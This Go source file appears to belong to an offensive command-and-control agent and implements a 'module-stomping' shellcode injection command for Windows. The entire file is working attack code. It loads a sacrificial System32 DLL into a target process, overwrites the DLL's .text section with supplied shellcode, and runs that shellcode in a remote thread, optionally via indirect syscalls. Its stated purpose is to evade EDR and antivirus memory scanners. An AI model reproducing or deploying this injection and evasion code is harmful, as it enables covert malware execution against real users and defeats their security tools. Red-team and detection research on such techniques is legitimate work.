//go:build windows
// +build windows

// Module stomping injection: loads a sacrificial DLL into the target process,
// then overwrites its .text section with shellcode. The shellcode executes from
// within a signed Microsoft DLL's address range, defeating private-memory
// detection heuristics used by EDR/AV memory scanners.

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	procLoadLibraryWStomp = kernel32.NewProc("LoadLibraryW")
)

// ModuleStompingCommand implements the module-stomping command.
type ModuleStompingCommand struct{}

func (c *ModuleStompingCommand) Name() string {
	return "module-stomping"
}

func (c *ModuleStompingCommand) Description() string {
	return "Inject shellcode by stomping a legitimate DLL's .text section in a remote process"
}

type moduleStompingParams struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	PID          int    `json:"pid"`
	DllName      string `json:"dll_name"`
}

func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult {
	if runtime.GOOS != "windows" {
		return structs.CommandResult{
			Output:    "Error: This command is only supported on Windows",
			Status:    "error",
			Completed: true,
		}
	}

	var params moduleStompingParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil || len(shellcode) == 0 {
		return structs.CommandResult{
			Output:    "Error: invalid or empty shellcode data",
			Status:    "error",
			Completed: true,
		}
	}

	if params.PID <= 0 {
		return structs.CommandResult{
			Output:    "Error: invalid PID specified",
			Status:    "error",
			Completed: true,
		}
	}

	if params.DllName == "" {
		params.DllName = "xpsservices.dll"
	}

	var sb strings.Builder
	sb.WriteString("[*] Module Stomping Injection\n")
	sb.WriteString(fmt.Sprintf("[*] Shellcode: %d bytes\n", len(shellcode)))
	sb.WriteString(fmt.Sprintf("[*] Target PID: %d\n", params.PID))
	sb.WriteString(fmt.Sprintf("[*] Sacrificial DLL: %s\n", params.DllName))
	if IndirectSyscallsAvailable() {
		sb.WriteString("[*] Using indirect syscalls\n")
	}

	// Step 1: Open target process
	desiredAccess := uint32(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
	hProcess, err := injectOpenProcess(desiredAccess, uint32(params.PID))
	if err != nil {
		sb.WriteString(fmt.Sprintf("[!] %v\n", err))
		return structs.CommandResult{Output: sb.String(), Status: "error", Completed: true}
	}
	defer injectCloseHandle(hProcess)
	sb.WriteString("[+] Opened process handle\n")

	// Step 2: Load sacrificial DLL into target process
	dllBase, err := stompLoadRemoteDLL(hProcess, uint32(params.PID), params.DllName, &sb)
	if err != nil {
		sb.WriteString(fmt.Sprintf("[!] Failed to load DLL: %v\n", err))
		return structs.CommandResult{Output: sb.String(), Status: "error", Completed: true}
	}
	sb.WriteString(fmt.Sprintf("[+] DLL loaded at base: 0x%X\n", dllBase))

	// Step 3: Parse remote PE headers to find .text section
	textRVA, textSize, err := stompFindRemoteTextSection(hProcess, dllBase)
	if err != nil {
		sb.WriteString(fmt.Sprintf("[!] Failed to find .text: %v\n", err))
		return structs.CommandResult{Output: sb.String(), Status: "error", Completed: true}
	}
	sb.WriteString(fmt.Sprintf("[*] .text section: RVA=0x%X, Size=%d bytes\n", textRVA, textSize))

	// Step 4: Verify shellcode fits in .text section
	if len(shellcode) > int(textSize) {
		sb.WriteString(fmt.Sprintf("[!] Shellcode (%d bytes) exceeds .text section (%d bytes)\n",
			len(shellcode), textSize))
		sb.WriteString("[!] Choose a larger sacrificial DLL or smaller shellcode\n")
		return structs.CommandResult{Output: sb.String(), Status: "error", Completed: true}
	}

	textAddr := dllBase + uintptr(textRVA)

	// Step 5: W^X — change .text protection to RW
	oldProtect, err := injectProtectMemory(hProcess, textAddr, len(shellcode), PAGE_READWRITE)
	if err != nil {
		sb.WriteString(fmt.Sprintf("[!] VirtualProtect(RW) failed: %v\n", err))
		return structs.CommandResult{Output: sb.String(), Status: "error", Completed: true}
	}
	_ = oldProtect
	sb.WriteString("[+] Changed .text protection to RW\n")

	// Step 6: Write shellcode over .text section
	written, err := injectWriteMemory(hProcess, textAddr, shellcode)
	if err != nil {
		injectProtectMemory(hProcess, textAddr, len(shellcode), PAGE_EXECUTE_READ)
		sb.WriteString(fmt.Sprintf("[!] WriteProcessMemory failed: %v\n", err))
		return structs.CommandResult{Output: sb.String(), Status: "error", Completed: true}
	}
	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes to .text at 0x%X\n", written, textAddr))

	// Step 7: W^X — restore .text protection to RX
	_, err = injectProtectMemory(hProcess, textAddr, len(shellcode), PAGE_EXECUTE_READ)
	if err != nil {
		sb.WriteString(fmt.Sprintf("[!] VirtualProtect(RX) failed: %v\n", err))
		return structs.CommandResult{Output: sb.String(), Status: "error", Completed: true}
	}
	sb.WriteString("[+] Restored .text protection to RX\n")

	// Step 8: Execute — create thread at .text base
	var hThread uintptr
	if IndirectSyscallsAvailable() {
		status := IndirectNtCreateThreadEx(&hThread, hProcess, textAddr)
		if status != 0 {
			sb.WriteString(fmt.Sprintf("[!] NtCreateThreadEx failed: NTSTATUS 0x%X\n", status))
			return structs.CommandResult{Output: sb.String(), Status: "error", Completed: true}
		}
	} else {
		var tid uintptr
		hThread, _, err = procCreateRemoteThread.Call(hProcess, 0, 0, textAddr, 0, 0,
			uintptr(unsafe.Pointer(&tid)))
		if hThread == 0 {
			sb.WriteString(fmt.Sprintf("[!] CreateRemoteThread failed: %v\n", err))
			return structs.CommandResult{Output: sb.String(), Status: "error", Completed: true}
		}
	}
	defer injectCloseHandle(hThread)

	sb.WriteString(fmt.Sprintf("[+] Thread created (handle: 0x%X)\n", hThread))
	sb.WriteString("[+] Shellcode executing from signed DLL address space\n")
	sb.WriteString("[+] Module stomping injection completed successfully\n")

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "completed",
		Completed: true,
	}
}

// stompLoadRemoteDLL loads a DLL into the target process via CreateRemoteThread + LoadLibraryW,
// then finds the loaded module base via CreateToolhelp32Snapshot.
func stompLoadRemoteDLL(hProcess uintptr, pid uint32, dllName string, sb *strings.Builder) (uintptr, error) {
	dllPath := `C:\Windows\System32\` + dllName

	// Convert path to UTF-16 bytes for the remote process
	dllPathW, _ := syscall.UTF16FromString(dllPath)
	dllPathBytes := make([]byte, len(dllPathW)*2)
	for i, v := range dllPathW {
		dllPathBytes[i*2] = byte(v)
		dllPathBytes[i*2+1] = byte(v >> 8)
	}

	// Allocate memory for DLL path in remote process
	pathAddr, err := injectAllocMemory(hProcess, len(dllPathBytes), PAGE_READWRITE)
	if err != nil {
		return 0, fmt.Errorf("allocate path memory: %v", err)
	}
	_, err = injectWriteMemory(hProcess, pathAddr, dllPathBytes)
	if err != nil {
		return 0, fmt.Errorf("write path: %v", err)
	}

	// Get LoadLibraryW address (kernel32 is loaded at same base in all processes)
	loadLibAddr := procLoadLibraryWStomp.Addr()
	sb.WriteString(fmt.Sprintf("[*] LoadLibraryW at 0x%X\n", loadLibAddr))

	// Create remote thread to call LoadLibraryW(pathAddr)
	var hThread uintptr
	if IndirectSyscallsAvailable() {
		status := IndirectNtCreateThreadExWithArg(&hThread, hProcess, loadLibAddr, pathAddr)
		if status != 0 {
			return 0, fmt.Errorf("NtCreateThreadEx(LoadLibraryW) failed: NTSTATUS 0x%X", status)
		}
	} else {
		var tid uintptr
		hThread, _, err = procCreateRemoteThread.Call(hProcess, 0, 0, loadLibAddr, pathAddr, 0,
			uintptr(unsafe.Pointer(&tid)))
		if hThread == 0 {
			return 0, fmt.Errorf("CreateRemoteThread(LoadLibraryW) failed: %v", err)
		}
	}

	// Wait for LoadLibraryW to complete (30s timeout)
	windows.WaitForSingleObject(windows.Handle(hThread), 30000)
	injectCloseHandle(hThread)
	sb.WriteString("[+] LoadLibraryW completed\n")

	// Find loaded module base via toolhelp32 snapshot
	dllBase, err := stompFindModule(pid, dllName)
	if err != nil {
		return 0, err
	}
	return dllBase, nil
}

// stompFindModule finds a module's base address in a remote process using toolhelp32.
func stompFindModule(pid uint32, dllName string) (uintptr, error) {
	snap, err := windows.CreateToolhelp32Snapshot(thSnapModule|thSnapModule32, pid)
	if err != nil {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot: %v", err)
	}
	defer windows.CloseHandle(snap)

	var me moduleEntry32W
	me.Size = uint32(unsafe.Sizeof(me))

	ret, _, callErr := procModule32FirstW.Call(uintptr(snap), uintptr(unsafe.Pointer(&me)))
	if ret == 0 {
		return 0, fmt.Errorf("Module32FirstW: %v", callErr)
	}

	target := strings.ToLower(dllName)
	for {
		name := windows.UTF16ToString(me.Module[:])
		if strings.ToLower(name) == target {
			return me.ModBaseAddr, nil
		}
		me.Size = uint32(unsafe.Sizeof(me))
		ret, _, _ = procModule32NextW.Call(uintptr(snap), uintptr(unsafe.Pointer(&me)))
		if ret == 0 {
			break
		}
	}

	return 0, fmt.Errorf("module %s not found in PID %d — DLL may not exist at C:\\Windows\\System32\\%s", dllName, pid, dllName)
}

// stompFindRemoteTextSection reads PE headers from a remote process to find the .text section.
func stompFindRemoteTextSection(hProcess, baseAddr uintptr) (uint32, uint32, error) {
	// Read DOS header
	var dosHeader imageDOSHeader
	err := injectReadMemoryInto(hProcess, baseAddr,
		unsafe.Pointer(&dosHeader), int(unsafe.Sizeof(dosHeader)))
	if err != nil {
		return 0, 0, fmt.Errorf("read DOS header: %v", err)
	}
	if dosHeader.EMagic != 0x5A4D {
		return 0, 0, fmt.Errorf("invalid DOS magic: 0x%X", dosHeader.EMagic)
	}

	// Read PE signature
	ntHeaderAddr := baseAddr + uintptr(dosHeader.ELfanew)
	var peSig uint32
	err = injectReadMemoryInto(hProcess, ntHeaderAddr,
		unsafe.Pointer(&peSig), 4)
	if err != nil {
		return 0, 0, fmt.Errorf("read PE signature: %v", err)
	}
	if peSig != 0x00004550 {
		return 0, 0, fmt.Errorf("invalid PE signature: 0x%X", peSig)
	}

	// Read file header
	var fileHeader imageFileHeader
	err = injectReadMemoryInto(hProcess, ntHeaderAddr+4,
		unsafe.Pointer(&fileHeader), int(unsafe.Sizeof(fileHeader)))
	if err != nil {
		return 0, 0, fmt.Errorf("read file header: %v", err)
	}

	// Walk section headers to find .text
	sectionAddr := ntHeaderAddr + 4 + 20 + uintptr(fileHeader.SizeOfOptionalHeader)
	for i := uint16(0); i < fileHeader.NumberOfSections; i++ {
		var section imageSectionHeader
		err = injectReadMemoryInto(hProcess,
			sectionAddr+uintptr(i)*40,
			unsafe.Pointer(&section), int(unsafe.Sizeof(section)))
		if err != nil {
			continue
		}
		name := string(section.Name[:])
		if strings.HasPrefix(name, ".text") {
			return section.VirtualAddress, section.VirtualSize, nil
		}
	}

	return 0, 0, fmt.Errorf(".text section not found in %d sections", fileHeader.NumberOfSections)
}
